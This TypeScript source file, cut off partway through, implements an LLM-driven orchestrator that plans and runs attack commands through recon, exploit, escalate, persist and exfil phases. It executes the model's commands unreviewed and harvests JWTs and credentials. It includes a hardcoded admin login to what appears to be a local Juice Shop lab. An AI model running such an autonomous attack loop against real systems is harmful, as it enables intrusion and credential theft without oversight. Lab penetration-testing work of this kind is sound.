import fs from 'fs';
import path from 'path';
import type { Mission, PhaseState, LLMMessage } from './types.js';
import { StreamingMemory } from './streaming-memory.js';
import { Executor } from './executor.js';
import { loadPrompt } from './prompt-loader.js';
import { SessionStore } from './session-store.js';
import { TodoStore } from './tools/todo-store.js';
import { readTool, listMissionFiles } from './tools/read-tool.js';
import {
  createInitialState,
  incrementIteration,
  addCommand,
  addFinding,
  updatePlan,
  isComplete,
  advancePhase,
} from './state.js';
import { REFLECTION_INTERVAL, PHASE_ADVANCE_THRESHOLD } from './config.js';
import {
  formatGE,
  formatFindings,
  parseFindings,
  colorize,
  formatSummary,
} from './utils/format.js';

export class Orchestrator {
  private mission: Mission;
  private memory: StreamingMemory;
  private executor: Executor;
  private state: PhaseState;
  private systemPrompt: string;
  private reconContent: string = '';
  private commandHistory: { cmd: string; stdout: string; stderr: string; exit_code: number }[] = [];
  private llmRouter: any = null;
  private cachedPlanContent: string = '';
  private cachedPlanPath: string = '';
  private tokenFile: string = '/tmp/ge_token.txt';
  private jwtTokenFile: string = '';
  private sessionStore: SessionStore;
  private todoStore: TodoStore;
  private reflectionCount: number = 0;
  private reflectionPath: string = '';
  private consecutiveNoProgress: number = 0;
  private lastCommandCount: number = 0;
  private contextFillStart: number = 0;

  constructor(mission: Mission) {
    this.mission = mission;
    this.memory = new StreamingMemory(`${process.env.HOME}/exploit-reports/${mission.missionId}`);
    this.executor = new Executor();
    this.state = createInitialState(mission.maxIterations);
    this.systemPrompt = loadPrompt('orchestrator');
    this.cachedPlanPath = `${process.env.HOME}/exploit-reports/${mission.missionId}/plan.md`;
    this.reflectionPath = `${process.env.HOME}/exploit-reports/${mission.missionId}/reflection_latest.md`;
    this.jwtTokenFile = `${process.env.HOME}/exploit-reports/${mission.missionId}/current_jwt.txt`;
    this.sessionStore = new SessionStore(`${process.env.HOME}/exploit-reports/${mission.missionId}`, mission.missionId, mission.targetUrl);
    this.todoStore = new TodoStore(`${process.env.HOME}/exploit-reports/${mission.missionId}`);
    this.loadReconReports();
    this.initLLMRouter();
    this.contextFillStart = Date.now();
  }

  private async initLLMRouter(): Promise<void> {
    const mod = await import('../../agent-swarm/dist/core/llm-router.js');
    this.llmRouter = mod.llmRouter;
  }

  private loadReconReports(): void {
    for (const reportPath of this.mission.reconReports) {
      const findingsPath = path.join(reportPath, 'findings_report.md');
      if (fs.existsSync(findingsPath)) {
        const content = fs.readFileSync(findingsPath, 'utf-8');
        this.reconContent += `\n\n## Report: ${path.basename(reportPath)}\n\n${content}`;
      }
    }
    this.memory.log(`Loaded ${this.mission.reconReports.length} recon reports (${this.reconContent.length} chars)\n`);
  }

  async start(): Promise<void> {
    console.log(`[GE] Mission ${this.mission.missionId} | Target: ${this.mission.targetUrl} | Max: ${this.mission.maxIterations}`);

    fs.writeFileSync('/tmp/ge_token.txt', '');
    this.tokenFile = `/tmp/ge_token_${this.mission.missionId}.txt`;
    fs.writeFileSync(this.tokenFile, '');

    const plan = await this.generatePlan();
    this.memory.updatePlan(plan);
    this.cachedPlanContent = plan;

    while (!isComplete(this.state, this.mission.maxIterations)) {
      this.state = incrementIteration(this.state);
      await this.runIteration();
    }

    this.memory.logSection('MISSION COMPLETE');
    this.saveFinalReport();
  }

  private async runIteration(): Promise<void> {
    this.memory.logSection(`ITERATION ${this.state.iteration}/${this.mission.maxIterations}`);

    this.checkForLoop();

    if (this.state.iteration > 0 && this.state.iteration % REFLECTION_INTERVAL === 0) {
      await this.performReflection();
    }

    this.checkPhaseAdvancement();

    const context = this.buildContext();

    if (this.state.pendingTasks.length === 0) {
      const plan = await this.generatePlan();
      this.memory.updatePlan(plan);
      this.cachedPlanContent = plan;
    }

    const command = await this.decideNextCommand(context);
    if (!command) {
      this.memory.log('No command decided, skipping iteration\n');
      return;
    }

    this.memory.log(`EXECUTING: ${command}\n`);
    console.log(formatGE('EXEC', `>>> ${command.substring(0, 100)}`));

    if (command.startsWith('query(')) {
      const queryResult = this.sessionStore.query();
      console.log(formatGE('QUERY', queryResult));
      this.memory.log(`QUERY RESULT:\n${queryResult}\n`);
      return;
    }

    let result;
    try {
      result = await this.executor.run(command);
      this.memory.log(`RESULT: exit=${result.exit_code} stdout_len=${result.stdout.length} stderr_len=${result.stderr.length}\n`);
      console.log(formatGE('EXEC', `<<< exit=${result.exit_code} bytes=${result.stdout.length}`));
    } catch (err) {
      console.log(formatGE('ERR', `Execution failed: ${err}`));
      this.memory.log(`EXEC ERROR: ${err}\n`);
      return;
    }

    const jwtMatch = result.stdout.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (jwtMatch) {
      const token = jwtMatch[0];
      const parts = token.split('.');
      if (parts.length === 3 && parts[0].length > 10 && parts[1].length > 10) {
        fs.writeFileSync(this.tokenFile, token);
        fs.writeFileSync(this.jwtTokenFile, token);
        console.log(formatGE('JWT', `Found & cached: ${token.substring(0, 40)}...`));
      } else {
        this.memory.log(`JWT found but appears malformed (${parts.length} parts), fetching from store\n`);
        const freshToken = this.getFreshJwt();
        if (freshToken) {
          fs.writeFileSync(this.tokenFile, freshToken);
          fs.writeFileSync(this.jwtTokenFile, freshToken);
          console.log(formatGE('JWT', `Using fresh JWT from store: ${freshToken.substring(0, 40)}...`));
        }
      }
    }

    if (command.includes('Authorization: Bearer') && result.stdout.includes('401')) {
      this.memory.log(`401 detected on protected endpoint - JWT may be expired. Flagging for refresh.\n`);
    }

    const cmdIndex = this.commandHistory.length;

    if (result.stdout.length > 0) {
      const baseName = this.sanitizeFilename(command);
      const stdoutFile = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/data/cmd${cmdIndex}_${baseName}.txt`;
      fs.mkdirSync(`${process.env.HOME}/exploit-reports/${this.mission.missionId}/data`, { recursive: true });
      fs.writeFileSync(stdoutFile, result.stdout);
      console.log(formatGE('DATA', `Stored ${result.stdout.length} bytes to ${baseName}.txt`));
    }

    this.commandHistory.push({
      cmd: command,
      stdout: result.stdout,
      stderr: result.stderr,
      exit_code: result.exit_code,
    });

    this.memory.appendCommand(command, result);
    this.state = addCommand(this.state, command, result);
    this.sessionStore.addCommand(command, result);
    this.todoStore.markCommandCompleted(command, `exit=${result.exit_code} bytes=${result.stdout.length}`);

    const skipAnalysis = this.shouldSkipAnalysis(command, result);
    if (skipAnalysis) {
      const summary = `Exit ${result.exit_code} | ${result.stdout.length} bytes`;
      console.log(formatGE('GE', summary));
    } else {
      let analysis;
      try {
        analysis = await this.analyzeResult(command, result, context);
      } catch (err) {
        console.log(formatGE('ERR', `Analysis failed: ${err}`));
        analysis = { findings: [], summary: `Exit ${result.exit_code} | ${result.stdout.length} bytes` };
      }

      if (result.exit_code === 0 && result.stdout.length > 200) {
        const isFileDownload = command.includes('/ftp/') || command.includes('.md') || command.includes('.txt') || command.includes('.json') || command.includes('.git');
        if (analysis.findings.length === 0 || isFileDownload) {
          this.memory.log(`EXEC SUCCESS (exit=0, ${result.stdout.length} bytes). Always trust exec result for file downloads.\n`);
          const cmdIndex = this.commandHistory.length - 1;
          const baseName = this.sanitizeFilename(command);
          const storedFile = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/data/cmd${cmdIndex}_${baseName}.txt`;
          if (fs.existsSync(storedFile)) {
            const storedContent = fs.readFileSync(storedFile, 'utf-8');
            if (isFileDownload || result.stdout.length > 500) {
              analysis = await this.analyzeStoredFile(command, storedContent, result.exit_code);
            }
          }
        }
      }

      for (const finding of analysis.findings) {
        const typedFinding = finding as { type: 'jwt' | 'credential' | 'endpoint' | 'vulnerability' | 'info' | 'exploit'; value: string; source: string; timestamp: number };
        this.state = addFinding(this.state, typedFinding);
        this.memory.appendFinding(typedFinding);
        this.sessionStore.addFinding(typedFinding);
        if (finding.type === 'jwt' || finding.type === 'credential') {
          this.sessionStore.addSecret(finding.type, finding.value);
        }
      }
      if (analysis.findings.length > 0) {
        const formattedFindings = analysis.findings.map(f => ({
          type: f.type,
          value: f.value,
          source: f.source,
        }));
        console.log(formatFindings(formattedFindings));
      }
      console.log(formatGE('GE', formatSummary(analysis.summary)));
    }

    const contextSize = this.estimateContextSize();
    const maxContext = this.mission.maxContextTokens * 0.8;
    if (contextSize > maxContext && this.commandHistory.length > 5) {
      this.memory.log(`Context size ${contextSize} > 80% of max (${maxContext}), triggering compaction\n`);
      await this.compactContext();
    }
  }

  private estimateContextSize(): number {
    const baseContext = this.buildContext();
    const recentOutputs = this.commandHistory.slice(-3).reduce((acc, e) => acc + e.stdout.length + e.stderr.length, 0);
    return baseContext.length + recentOutputs;
  }

  private async compactContext(): Promise<void> {
    const basePath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}`;
    const missionDir = basePath;

    this.memory.log(`Starting context compaction - sequential file processing...\n`);

    const allFiles = listMissionFiles(missionDir);
    const reportPath = `${basePath}/mission_report.md`;

    const compactReport = `# Compaction Report - ${new Date().toISOString()}
Mission: ${this.mission.targetUrl}
Phase: ${this.state.phase} | Commands: ${this.commandHistory.length} | Findings: ${this.state.findings.length}

`;

    const keyFiles = ['findings.md', 'secrets.md', 'commands.md', 'plan.md', 'current_jwt.txt'];
    const filesToProcess: { file: string; basename: string }[] = [];

    for (const file of allFiles) {
      const basename = path.basename(file);
      if (keyFiles.includes(basename) || basename.startsWith('llm_analysis_')) {
        filesToProcess.push({ file, basename });
      }
    }

    let report = compactReport;

    for (const { file, basename } of filesToProcess) {
      const result = readTool({ filePath: file, offset: 0, limit: 500 });

      if (result.output.includes('<error>') || result.output.includes('<dir>')) {
        continue;
      }

      const extractionPrompt = `Extract key info from this file for a mission report. Output ONLY a brief summary (max 200 words).

FILE: ${basename}
CONTENT:
${result.output}

Respond with ONLY a concise summary of the most important findings.`;

      const messages: LLMMessage[] = [
        { role: 'system', content: 'You are a data extraction agent. Output ONLY plain text summary, no formatting.' },
        { role: 'user', content: extractionPrompt },
      ];

      try {
        const response = await this.complete(messages, 0.3);
        report += `\n## ${basename}\n${response.trim()}\n`;
        this.memory.log(`Compacted: ${basename}\n`);
      } catch {
        this.memory.log(`Failed to compact: ${basename}\n`);
      }

      if (report.length > 8000) break;
    }

    report += `\n## Pending Tasks\n`;
    for (const task of this.state.pendingTasks.slice(0, 5)) {
      report += `- ${task}\n`;
    }

    report += `\n## Next Actions\n`;
    report += `- Continue exploitation phase with focus on: SQLi, IDOR, path traversal\n`;
    report += `- JWT token age: ${this.getJwtAgeMs() < 600000 ? 'fresh (<10min)' : 'needs refresh'}\n`;

    fs.writeFileSync(reportPath, report);
    this.memory.log(`Compaction complete: mission_report.md (${report.length} chars)\n`);
    this.contextFillStart = Date.now();
  }

  private async analyzeStoredFile(
    command: string,
    content: string,
    exitCode: number
  ): Promise<{ findings: Array<{ type: string; value: string; source: string; timestamp: number }>; summary: string }> {
    const prompt = `## FILE CONTENT (from successful command execution)
Command succeeded (exit=${exitCode}) with ${content.length} bytes stored.
Content preview:
${content.substring(0, 3000)}

## Task
Analyze this file content for:
- Credentials, passwords, API keys
- JWT tokens
- Internal URLs or endpoints
- Exposed configuration
- Source code or sensitive file contents
- Repository URLs (git config)
- Database connection strings
- Any other exploitable information

## Output Format (JSON)
{
  "findings": [{"type": "info|credential|vulnerability", "value": "specific finding", "source": "file content analysis"}],
  "summary": "what this file contains and its security relevance"
}`;

    const messages: LLMMessage[] = [
      { role: 'system', content: 'You are an expert pen tester. Output ONLY JSON.' },
      { role: 'user', content: prompt },
    ];

    try {
      const response = await this.complete(messages, 0.3);
      this.writeLLMOutput(`file_analysis_iter${this.state.iteration}`, response);

      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        return {
          findings: (parsed.findings || []).map((f: { type: string; value: string; source?: string }) => ({
            ...f,
            timestamp: Date.now(),
          })),
          summary: parsed.summary || `Found ${content.length} bytes of file content`,
        };
      }
    } catch {
      // ignore
    }

    return {
      findings: [{
        type: 'info' as const,
        value: `Downloaded file: ${content.substring(0, 200)}... (${content.length} bytes)`,
        source: 'file content analysis',
        timestamp: Date.now(),
      }],
      summary: `File download: ${content.length} bytes`,
    };
  }

  private getCachedToken(): string {
    try {
      if (fs.existsSync(this.tokenFile)) {
        const token = fs.readFileSync(this.tokenFile, 'utf-8').trim();
        if (token && token.startsWith('eyJ') && token.split('.').length === 3) {
          return token;
        }
      }
    } catch { }
    const storeJwt = this.sessionStore.getLatestJwt();
    if (storeJwt) {
      fs.writeFileSync(this.tokenFile, storeJwt);
      return storeJwt;
    }
    return '';
  }

  private hasValidJwt(): boolean {
    const token = this.getCachedToken();
    if (!token || token.length < 50 || !token.startsWith('eyJ') || token.split('.').length !== 3) {
      return false;
    }
    const age = this.getJwtAgeMs();
    if (age > 600_000) {
      this.memory.log(`JWT expired (age: ${Math.round(age / 1000)}s > 600s), marking invalid\n`);
      return false;
    }
    return true;
  }

  private getJwtAgeMs(): number {
    try {
      const stats = fs.statSync(this.jwtTokenFile);
      return Date.now() - stats.mtimeMs;
    } catch {
      return Infinity;
    }
  }

  private async refreshJwt(): Promise<void> {
    this.memory.log(`Refreshing expired JWT...\n`);
    const cmd = `curl -s -X POST "http://127.0.0.1:3000/rest/user/login" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'`;
    const result = await this.executor.run(cmd);
    const jwtMatch = result.stdout.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (jwtMatch) {
      const token = jwtMatch[0];
      fs.writeFileSync(this.tokenFile, token);
      fs.writeFileSync(this.jwtTokenFile, token);
      this.memory.log(`JWT refreshed successfully\n`);
    }
  }

  private getFreshJwt(): string | null {
    return this.sessionStore.getLatestJwt();
  }

  private sanitizeFilename(command: string): string {
    const urlMatch = command.match(/https?:\/\/[^\/]+([^\s'"]+)/);
    if (urlMatch) {
      let path = urlMatch[1].replace(/\//g, '_').replace(/[?&=]/g, '_').substring(0, 50);
      return path || 'output';
    }
    return 'output';
  }

  private shouldSkipAnalysis(command: string, result: { exit_code: number; stdout: string }): boolean {
    if (result.exit_code !== 0) return false;
    if (command.includes('POST') || command.includes('PUT') || command.includes('DELETE')) return false;
    if (command.includes('/exploit-reports/') || command.includes('secrets.md') || command.includes('findings.md')) return true;
    if (command.includes('Authorization: Bearer')) return false;
    if (result.stdout.includes('password') || result.stdout.includes('credential')) return false;
    if (result.stdout.length > 5000) return false;
    return true;
  }

private buildContext(): string {
    const MAX_CONTEXT = this.mission.maxContextTokens;

    const recentCount = Math.min(5, this.commandHistory.length);
    const olderCount = this.commandHistory.length - recentCount;

    let context = `## MISSION
Target: ${this.mission.targetUrl}
Phase: ${this.state.phase}
Iteration: ${this.state.iteration}/${this.mission.maxIterations}
Commands run: ${this.commandHistory.length}
Findings: ${this.state.findings.length}

`;

    const basePath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}`;
    const missionReportPath = `${basePath}/mission_report.md`;
    if (fs.existsSync(missionReportPath)) {
      const missionReport = fs.readFileSync(missionReportPath, 'utf-8');
      context += `## MISSION REPORT (auto-generated context)\n${missionReport.substring(0, 4000)}\n\n`;
    }

    context += `## TODO SNAPSHOT\n${this.todoStore.getSnapshot()}\n\n`;

    if (this.reconContent.length > 0) {
      context += `## RECON DATA\n${this.reconContent.substring(0, 3000)}\n\n`;
    }

    const jwtFindings = this.state.findings.filter(f => f.type === 'jwt');
    if (jwtFindings.length > 0) {
      context += `## ALL JWT TOKENS (${jwtFindings.length} - USE THE MOST RECENT ONE)\n`;
      for (const f of jwtFindings.slice(-5)) {
        context += `${f.value}\n`;
      }
      context += `\n`;
    }

    const credFindings = this.state.findings.filter(f => f.type === 'credential');
    if (credFindings.length > 0) {
      context += `## ALL CREDENTIALS (${credFindings.length})\n`;
      for (const f of credFindings) {
        context += `[${f.source}] ${f.value}\n`;
      }
      context += `\n`;
    }

    if (this.state.findings.length > 0) {
      const otherFindings = this.state.findings.filter(f => f.type !== 'jwt' && f.type !== 'credential');
      if (otherFindings.length > 0) {
        context += `## OTHER FINDINGS\n`;
        for (const f of otherFindings.slice(-15)) {
          context += `[${f.type}] ${f.value.substring(0, 150)}\n`;
        }
        context += `\n`;
      }
    }

    if (recentCount > 0) {
      context += `## RECENT COMMANDS (last ${recentCount})\n`;
      const recent = this.commandHistory.slice(-recentCount);
      for (const entry of recent) {
        context += `CMD: ${entry.cmd.substring(0, 120)}\nEXIT: ${entry.exit_code}\n`;
        const isJwtOutput = entry.stdout.includes('eyJ');
        const outLen = isJwtOutput ? 500 : 300;
        context += `OUT: ${entry.stdout.substring(0, outLen)}\n\n`;
      }
    }

    if (olderCount > 0) {
      const older = this.commandHistory.slice(0, -recentCount);
      const curlCount = older.filter(e => e.cmd.includes('curl')).length;
      const postCount = older.filter(e => e.cmd.includes('POST')).length;
      context += `## OLDER COMMANDS (${olderCount} total)\n`;
      context += `Curl: ${curlCount} | POST: ${postCount}\n\n`;
    }

    if (this.cachedPlanContent) {
      context += `## CURRENT PLAN\n${this.cachedPlanContent.substring(0, 1500)}\n\n`;
    }

    if (context.length > MAX_CONTEXT) {
      context = context.substring(0, MAX_CONTEXT);
    }

    return context;
  }

  private async completeStream(messages: LLMMessage[], temperature = 0.75): Promise<string> {
    if (!this.llmRouter) await this.initLLMRouter();

    this.writeLLMOutput(`llm_input_iter${this.state.iteration}`, JSON.stringify(messages, null, 2));

    let fullResponse = '';
    const timeoutMs = 60000;
    const MAX_RESPONSE_LENGTH = 8000;

    try {
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('LLM stream timeout (60s)')), timeoutMs);
      });

      const streamPromise = (async () => {
        for await (const chunk of this.llmRouter.completeStream('gamma', messages, { temperature })) {
          fullResponse += chunk;
          const colored = colorize(chunk);
          process.stdout.write(colored);
          if (fullResponse.length > MAX_RESPONSE_LENGTH) {
            this.memory.log(`WARNING: Response exceeded ${MAX_RESPONSE_LENGTH} chars, truncating\n`);
            fullResponse = fullResponse.substring(0, MAX_RESPONSE_LENGTH);
            break;
          }
        }
      })();

      await Promise.race([streamPromise, timeoutPromise]);
    } catch (err) {
      this.memory.log(`LLM stream error: ${err}\n`);
      console.log(formatGE('ERR', `LLM error: ${err}`));
    }

    process.stdout.write('\n');
    this.writeLLMOutput(`llm_output_iter${this.state.iteration}`, fullResponse);
    return fullResponse;
  }

  private checkForLoop(): void {
    const currentCmdCount = this.commandHistory.length;
    if (currentCmdCount === this.lastCommandCount) {
      this.consecutiveNoProgress++;
      if (this.consecutiveNoProgress >= 3) {
        this.memory.log(`STUCK DETECTED: ${this.consecutiveNoProgress} iterations without new commands, forcing reflection\n`);
        this.performReflection().catch(() => {});
      }
    } else {
      this.consecutiveNoProgress = 0;
    }
    this.lastCommandCount = currentCmdCount;
  }

  private checkPhaseAdvancement(): void {
    const findingsByPhase: Record<string, { jwt: number; credential: number; vulnerability: number }> = {
      recon: { jwt: 0, credential: 0, vulnerability: 0 },
      exploit: { jwt: 0, credential: 0, vulnerability: 0 },
      escalate: { jwt: 0, credential: 0, vulnerability: 0 },
      persist: { jwt: 0, credential: 0, vulnerability: 0 },
      exfil: { jwt: 0, credential: 0, vulnerability: 0 },
    };

    for (const f of this.state.findings) {
      if (f.type === 'jwt') findingsByPhase[this.state.phase].jwt++;
      if (f.type === 'credential') findingsByPhase[this.state.phase].credential++;
      if (f.type === 'vulnerability' || f.type === 'exploit') findingsByPhase[this.state.phase].vulnerability++;
    }

    const currentPhaseFindings = findingsByPhase[this.state.phase];
    const hasSignificantFindings = currentPhaseFindings.jwt > 0 || currentPhaseFindings.credential > 0 || currentPhaseFindings.vulnerability >= PHASE_ADVANCE_THRESHOLD;

    if (this.state.phase === 'recon' && hasSignificantFindings) {
      this.state = advancePhase(this.state);
      this.sessionStore.setPhase(this.state.phase);
      this.memory.log(`PHASE ADVANCED to: ${this.state.phase}\n`);
    } else if (this.state.phase === 'exploit' && currentPhaseFindings.vulnerability >= PHASE_ADVANCE_THRESHOLD) {
      this.state = advancePhase(this.state);
      this.sessionStore.setPhase(this.state.phase);
      this.memory.log(`PHASE ADVANCED to: ${this.state.phase}\n`);
    } else if (this.state.pendingTasks.length === 0 && this.state.completedTasks.length >= PHASE_ADVANCE_THRESHOLD) {
      this.state = advancePhase(this.state);
      this.sessionStore.setPhase(this.state.phase);
      this.memory.log(`PHASE ADVANCED (tasks complete) to: ${this.state.phase}\n`);
    }
  }

private async performReflection(): Promise<void> {
    this.reflectionCount++;
    this.memory.logSection(`STRATEGIC REFLECTION ${this.reflectionCount}`);

    const basePath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}`;
    const missionDir = basePath;

    const allFiles = listMissionFiles(missionDir);
    this.memory.log(`Found ${allFiles.length} files in mission directory\n`);

    const reportPath = `${basePath}/mission_report.md`;
    fs.writeFileSync(reportPath, '');

    const keyFiles = ['findings.md', 'secrets.md', 'commands.md', 'plan.md', 'current_jwt.txt', 'todo-store.json'];
    const filesToProcess: string[] = [];

    for (const file of allFiles) {
      const basename = path.basename(file);
      if (keyFiles.includes(basename) || basename.startsWith('llm_analysis_') || basename.startsWith('llm_cmd_')) {
        filesToProcess.push(file);
      }
    }

    const fileTypePrompts: Record<string, string> = {
      'findings.md': 'Extract: all vulnerability findings with severity, credentials, JWT tokens.',
      'secrets.md': 'Extract: all secrets, tokens, passwords, API keys.',
      'commands.md': 'Extract: command history summary - what succeeded, what failed.',
      'plan.md': 'Extract: current plan and pending tasks.',
      'current_jwt.txt': 'Extract: JWT token value, validity status, age.',
      'todo-store.json': 'Extract: completed tasks, pending tasks.',
    };

    for (let i = 0; i < filesToProcess.length; i++) {
      const file = filesToProcess[i];
      const basename = path.basename(file);
      const fileResult = readTool({ filePath: file, offset: 0, limit: 600 });

      if (fileResult.output.includes('<error>') || fileResult.output.includes('<dir>')) {
        this.memory.log(`Skipping unreadable: ${basename}\n`);
        continue;
      }

      const extractionPrompt = `Extract key findings from this file for a mission report.

FILE: ${basename}
MISSION: ${this.mission.targetUrl} | Phase: ${this.state.phase}

FILE CONTENT:
${fileResult.output}

OUTPUT FORMAT (plain text only, NO XML, NO markdown code blocks, NO tool calls):
### ${basename}

[Your extraction here - max 300 words. List credentials, vulns, tokens, endpoints.]`;

      const messages: LLMMessage[] = [
        { role: 'system', content: 'STRICT RULE: Output ONLY plain text. NO <write_file> tags. NO <content> tags. NO XML. NO markdown code blocks. Just the extracted text starting with "### filename".' },
        { role: 'user', content: extractionPrompt },
      ];

      try {
        const response = await this.complete(messages, 0.3);
        this.writeLLMOutput(`reflection_${this.reflectionCount}_file_${i}`, response);

        const existing = fs.existsSync(reportPath) ? fs.readFileSync(reportPath, 'utf-8') : '';
        fs.writeFileSync(reportPath, existing + '\n\n' + response.trim());
        this.memory.log(`Appended ${basename} to mission_report.md\n`);
      } catch (e) {
        this.memory.log(`Failed to extract ${basename}: ${e}\n`);
      }
    }

    await this.synthesizeStrategicPlan(basePath, reportPath);
  }

  private async synthesizeStrategicPlan(basePath: string, reportPath: string): Promise<void> {
    const reportContent = fs.existsSync(reportPath) ? fs.readFileSync(reportPath, 'utf-8') : '';

    const synthesisPrompt = `You are a strategic planning agent. Read the mission report below and produce a strategic plan.

## MISSION INFO
- Target: ${this.mission.targetUrl}
- Iteration: ${this.state.iteration}/${this.mission.maxIterations}
- Phase: ${this.state.phase}
- Commands Run: ${this.commandHistory.length}
- Findings: ${this.state.findings.length}

## MISSION REPORT (already compiled):
${reportContent}

## YOUR TASK
1. Read the mission report above
2. Output ONLY the strategic plan in XML format (no markdown, no other text)

## OUTPUT FORMAT (XML only):
<r>
  <summary>What's been accomplished in 2-3 sentences</summary>
  <what_worked>Techniques/endpoints that succeeded [comma separated]</what_worked>
  <what_failed>Techniques/endpoints that failed [comma separated]</what_failed>
  <remaining>Unexplored attack surface remaining</remaining>
  <advance_phase>YES/NO - should we advance to next phase?</advance_phase>
  <new_phase>If YES: exploit/escalate/persist/exfil</new_phase>
</r>
<p>
  <phase>
    <name>next_phase_name</name>
    <description>Description of focus for this phase</description>
    <tasks>
      <task>Specific attack task 1</task>
      <task>Specific attack task 2</task>
      <task>Specific attack task 3</task>
    </tasks>
  </phase>
</p>`;

    const messages: LLMMessage[] = [
      { role: 'system', content: 'You are an elite penetration tester. Output ONLY valid XML. No markdown, no JSON, no explanations outside XML tags.' },
      { role: 'user', content: synthesisPrompt },
    ];

    try {
      const response = await this.complete(messages, 0.6);
      this.writeLLMOutput(`reflection_${this.reflectionCount}_synthesis`, response);

      const xmlMatch = response.match(/<r>[\s\S]*?<\/r>\s*<p>[\s\S]*?<\/p>/);
      if (xmlMatch) {
        const xml = xmlMatch[0];
        const summary = this.extractXML(xml, 'summary');
        const whatWorked = this.extractXML(xml, 'what_worked');
        const whatFailed = this.extractXML(xml, 'what_failed');
        const remaining = this.extractXML(xml, 'remaining');
        const shouldAdvance = this.extractXML(xml, 'advance_phase');
        const newPhase = this.extractXML(xml, 'new_phase');

        if (summary) this.memory.log(`REFLECTION SUMMARY: ${summary}\n`);
        if (whatWorked) this.memory.log(`WHAT WORKED: ${whatWorked.substring(0, 200)}\n`);
        if (whatFailed) this.memory.log(`WHAT FAILED: ${whatFailed.substring(0, 200)}\n`);

        if (shouldAdvance.toUpperCase() === 'YES') {
          if (newPhase && ['exploit', 'escalate', 'persist', 'exfil'].includes(newPhase.toLowerCase())) {
            this.state = { ...this.state, phase: newPhase.toLowerCase() as any };
          } else {
            this.state = advancePhase(this.state);
          }
          this.sessionStore.setPhase(this.state.phase);
          this.memory.log(`PHASE ADVANCED via reflection to: ${this.state.phase}\n`);
        }

        const plan = this.parsePlanXML(xml);
        if (plan) {
          const planText = this.formatPlanAsText(plan);
          const pendingTasks = plan.phases.flatMap((p) => p.tasks);
          this.state = updatePlan(this.state, {
            tasks: pendingTasks,
            completedTasks: this.state.completedTasks,
            currentPlan: pendingTasks.map((t) => `- [ ] ${t}`),
          });
          this.sessionStore.setTasks(pendingTasks, this.state.completedTasks);
          this.memory.updatePlan(planText);
          this.cachedPlanContent = planText;
          this.memory.log(`Plan updated with ${pendingTasks.length} tasks\n`);
        }
      }

      const reflectionSummary = `# Reflection ${this.reflectionCount}
Generated at iteration ${this.state.iteration}
Phase: ${this.state.phase}
Commands: ${this.commandHistory.length}
Findings: ${this.state.findings.length}
`;
      fs.writeFileSync(`${basePath}/reflection_latest.md`, reflectionSummary);
      this.memory.log(`Reflection ${this.reflectionCount} complete\n`);

    } catch (e) {
      this.memory.log(`Strategic synthesis failed: ${e}\n`);
    }
  }

  private async complete(messages: LLMMessage[], temperature = 0.75): Promise<string> {
    return this.completeStream(messages, temperature);
  }

  private extractXML(xml: string, tag: string): string {
    const match = xml.match(new RegExp(`<${tag}>([\\s\\S]*?)</${tag}>`));
    return match?.[1]?.trim() || '';
  }

  private parsePlanXML(xml: string): { phases: { name: string; description: string; tasks: string[] }[] } | null {
    try {
      const phases: { name: string; description: string; tasks: string[] }[] = [];
      const phaseMatches = xml.matchAll(/<phase>[\s\S]*?<\/phase>/g);
      for (const phaseBlock of phaseMatches) {
        const block = phaseBlock[0];
        const name = this.extractXML(block, 'name');
        const description = this.extractXML(block, 'description');
        const taskMatches = block.matchAll(/<task>([\s\S]*?)<\/task>/g);
        const tasks = Array.from(taskMatches, m => m[1].trim());
        if (name && tasks.length > 0) {
          phases.push({ name, description, tasks });
        }
      }
      if (phases.length > 0) return { phases };

      const jsonMatch = xml.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        if (parsed.phases && Array.isArray(parsed.phases)) {
          return { phases: parsed.phases };
        }
        if (parsed.tasks && Array.isArray(parsed.tasks)) {
          return { phases: [{ name: this.state.phase || 'exploit', description: 'Current phase', tasks: parsed.tasks }] };
        }
      }
    } catch {
      // ignore
    }
    return null;
  }

  private async generatePlan(): Promise<string> {
    const prompt = `## Recon Reports\n${this.reconContent.substring(0, 3000)}\n\n## Current State\nPhase: ${this.state.phase}\nFindings so far: ${this.state.findings.length}\nCommands run: ${this.commandHistory.length}\n\n## Task\nGenerate a detailed exploit plan with phases and tasks for the target.\n\n## Output Format (XML only, no markdown)\n<p>\n  <phase>\n    <name>recon</name>\n    <description>Reconnaissance phase</description>\n    <tasks>\n      <task>task 1</task>\n      <task>task 2</task>\n    </tasks>\n  </phase>\n</p>`;

    const messages: LLMMessage[] = [
      { role: 'system', content: 'You are an elite penetration tester. Output ONLY valid XML. No markdown, no JSON.' },
      { role: 'user', content: prompt },
    ];

    this.memory.log('Generating exploit plan...\n');

    try {
      const response = await this.complete(messages, 0.75);
      this.writeLLMOutput('plan', response);

      const plan = this.parsePlanXML(response);
      if (plan) {
        const text = this.formatPlanAsText(plan);
        const pendingTasks = plan.phases.flatMap((p) => p.tasks);
        this.state = updatePlan(this.state, {
          tasks: pendingTasks,
          completedTasks: [],
          currentPlan: pendingTasks.map((t) => `- [ ] ${t}`),
        });
        return text;
      }
    } catch (e) {
      this.memory.log(`Plan generation failed: ${e}\n`);
    }

    return '- [ ] Recon target\n- [ ] Attempt authentication\n- [ ] Escalate privileges';
  }

  private formatPlanAsText(plan: { phases: { name: string; description: string; tasks: string[] }[] }): string {
    let text = `## Exploit Plan\n\n`;
    for (const phase of plan.phases) {
      text += `### ${phase.name}: ${phase.description}\n`;
      for (const task of phase.tasks) {
        text += `- [ ] ${task}\n`;
      }
      text += `\n`;
    }
    return text;
  }

  private async decideNextCommand(context: string): Promise<string | null> {
    const pending = this.state.pendingTasks.slice(0, 5).join('\n') || 'No pending tasks - choose next action';

    const jwtFindings = this.state.findings.filter(f => f.type === 'jwt');
